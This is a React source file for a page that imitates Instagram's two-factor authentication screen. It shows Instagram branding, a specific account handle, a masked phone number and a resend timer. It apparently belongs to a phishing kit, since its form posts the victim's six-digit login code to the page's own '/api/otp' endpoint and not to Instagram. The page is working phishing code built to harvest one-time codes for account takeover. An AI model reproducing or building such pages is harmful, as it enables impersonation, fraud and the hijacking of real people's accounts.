import { useEffect, useState } from 'react';

export default function OTPPage() {
  const [seconds, setSeconds] = useState(60);

  useEffect(() => {
    const timer = setInterval(() => {
      setSeconds((sec) => {
        if (sec <= 1) {
          clearInterval(timer);
          return 0;
        }
        return sec - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, []);

  return (
    <div style={{
      backgroundColor: "#000",
      color: "#fff",
      fontFamily: "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif",
      minHeight: "200vh", // ✅ Fix added here
      boxSizing: "border-box"
    }}>
      <div style={{ padding: "16px 0 10px", borderBottom: "1px solid #222", textAlign: "center" }}>
        <img src="/instagram-icon.png" alt="Instagram Icon" style={{ width: "30px", height: "30px", verticalAlign: "middle", marginRight: "8px" }} />
        <span style={{ fontWeight: 600, fontSize: "16px", verticalAlign: "middle" }}>ruma.rahman7 • Instagram</span>
      </div>

      <div style={{ padding: "20px" }}>
        <h2 style={{ fontSize: "20px", textAlign: "center", marginBottom: "8px" }}>Two-Factor Authentication</h2>
        <p style={{ fontSize: "13px", color: "#aaa", textAlign: "center", marginBottom: "20px" }}>
          Enter the 6-digit code sent to your phone number ending in ••••30
        </p>
        <form method="POST" action="/api/otp">
          <input
            type="text"
            name="otp"
            placeholder="______"
            maxLength="6"
            required
            style={{
              width: "100%",
              padding: "14px 16px",
              marginBottom: "20px",
              border: "1px solid #333",
              borderRadius: "14px",
              backgroundColor: "#1a1a1a",
              color: "#fff",
              fontSize: "18px",
              textAlign: "center",
              letterSpacing: "6px",
              boxShadow: "inset 0 1px 2px rgba(0, 0, 0, 0.4)",
              boxSizing: "border-box"
            }}
          />
          <div style={{ textAlign: "center", fontSize: "14px", color: "#888", marginBottom: "20px" }}>
            Resend OTP in <span>{seconds}</span>s
          </div>
          <button
            type="submit"
            style={{
              width: "100%",
              padding: "14px",
              backgroundColor: "#3897f0",
              color: "#fff",
              border: "none",
              borderRadius: "14px",
              fontSize: "15px",
              fontWeight: "bold",
              cursor: "pointer"
            }}
          >
            Continue
          </button>
        </form>
      </div>
    </div>
  );
}
